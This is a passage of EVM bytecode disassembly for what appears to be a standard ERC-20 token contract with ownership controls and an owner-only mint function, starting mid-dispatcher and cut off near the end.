PUSH4 0x23B872DD EQ PUSH2 0x140 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x170 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x18E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xDC PUSH2 0x29C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xE9 SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x10C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x107 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x119 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x12A PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x137 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x15A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x155 SWAP2 SWAP1 PUSH2 0xF5C JUMP JUMPDEST PUSH2 0x35B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x167 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x178 PUSH2 0x38A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x185 SWAP2 SWAP1 PUSH2 0xFCB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1A8 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1A3 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x393 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1B5 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1C6 PUSH2 0x3DB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1D0 PUSH2 0x3EF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1DD SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1EE PUSH2 0x419 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FB SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x21E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x219 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4AB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x23A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x235 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4D4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x247 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x26A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x265 SWAP2 SWAP1 PUSH2 0x103D JUMP JUMPDEST PUSH2 0x4F7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x277 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x29A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x295 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x57E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH2 0x2AB SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x2D7 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x324 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2F9 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x324 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x307 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x339 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x346 DUP2 DUP6 DUP6 PUSH2 0x60C JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x366 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x373 DUP6 DUP3 DUP6 PUSH2 0x61E JUMP JUMPDEST PUSH2 0x37E DUP6 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x12 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3E3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x3ED PUSH1 0x0 PUSH2 0x82D JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH2 0x428 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x454 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x4A1 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x476 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x4A1 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x484 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x4B3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x4D0 DUP3 PUSH8 0xDE0B6B3A7640000 DUP4 PUSH2 0x4CB SWAP2 SWAP1 PUSH2 0x110C JUMP JUMPDEST PUSH2 0x8F3 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x4DF PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x4EC DUP2 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x586 PUSH2 0x7A6 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x5F8 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5EF SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x601 DUP2 PUSH2 0x82D JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x619 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x975 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x62A DUP5 DUP5 PUSH2 0x4F7 JUMP JUMPDEST SWAP1 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 EQ PUSH2 0x6AC JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x69C JUMPI DUP3 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xFB8F41B200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x693 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x6AB DUP5 DUP5 DUP5 DUP5 SUB PUSH1 0x0 PUSH2 0x975 JUMP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x724 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x71B SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x796 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xEC442F0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x78D SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x7A1 DUP4 DUP4 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x7AE PUSH2 0x604 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x7CC PUSH2 0x3EF JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x82B JUMPI PUSH2 0x7EF PUSH2 0x604 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH32 0x118CDAA700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x822 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x965 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x95C SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x971 DUP3 PUSH1 0x0 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x9E7 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xE602DF0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x9DE SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xA59 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x94280D6200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA50 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 PUSH1 0x1 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP1 ISZERO PUSH2 0xB46 JUMPI DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP5 PUSH1 0x40 MLOAD PUSH2 0xB3D SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xB9E JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0xB92 SWAP2 SWAP1 PUSH2 0x1185 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xC71 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP DUP2 DUP2 LT ISZERO PUSH2 0xC2A JUMPI DUP4 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xE450D38C00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC21 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP2 SUB PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0xCBA JUMPI DUP1 PUSH1 0x2 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0xD07 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD PUSH2 0xD64 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xDAB JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xD90 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xDD3 DUP3 PUSH2 0xD71 JUMP JUMPDEST PUSH2 0xDDD DUP2 DUP6 PUSH2 0xD7C JUMP JUMPDEST SWAP4 POP PUSH2 0xDED DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0xD8D JUMP JUMPDEST PUSH2 0xDF6 DUP2 PUSH2 0xDB7 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xE1B DUP2 DUP5 PUSH2 0xDC8 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE53 DUP3 PUSH2 0xE28 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE63 DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP2 EQ PUSH2 0xE6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xE80 DUP2 PUSH2 0xE5A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE99 DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP2 EQ PUSH2 0xEA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xEB6 DUP2 PUSH2 0xE90 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xED3 JUMPI PUSH2 0xED2 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xEE1 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0xEF2 DUP6 DUP3 DUP7 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF11 DUP2 PUSH2 0xEFC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF2C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF08 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xF3B DUP2 PUSH2 0xE86 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xF56 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF32 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0xF75 JUMPI PUSH2 0xF74 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF83 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0xF94 DUP7 DUP3 DUP8 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0xFA5 DUP7 DUP3 DUP8 ADD PUSH2 0xEA7 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFC5 DUP2 PUSH2 0xFAF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xFE0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xFBC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFFC JUMPI PUSH2 0xFFB PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x100A DUP5 DUP3 DUP6 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x101C DUP2 PUSH2 0xE48 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1037 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1013 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1054 JUMPI PUSH2 0x1053 PUSH2 0xE23 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1062 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1073 DUP6 DUP3 DUP7 ADD PUSH2 0xE71 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x10C4 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x10D7 JUMPI PUSH2 0x10D6 PUSH2 0x107D JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 